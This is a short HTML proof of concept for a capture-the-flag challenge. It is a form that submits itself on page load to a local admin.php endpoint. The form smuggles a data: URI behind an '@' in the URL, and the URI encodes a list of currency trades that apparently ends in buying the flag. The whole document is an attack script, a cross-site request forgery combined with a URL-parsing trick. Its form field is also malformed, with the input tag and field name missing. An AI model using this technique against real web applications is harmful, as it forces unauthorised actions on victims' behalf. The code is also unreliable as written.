<title>ctf poc</title>

<form method="post" action="http://localhost:5000/admin.php">

    value="http://localhost:5000/admin.php@data:text/plain,-%20amount:%201000000%0A%20%20currency:%20ZZZ%0A%20%20op:%20BUY%0A-%20amount:%201000000%0A%20%20currency:%20ZZZ%0A%20%20op:%20SELL%0A-%20amount:%201%0A%20%20currency:%20FL%0A%20%20op:%20BUY">
</form>

<script>
  // Auto-submit immediately (no '+' concatenation anywhere, to avoid mangling)
  document.forms[0].submit();
</script>
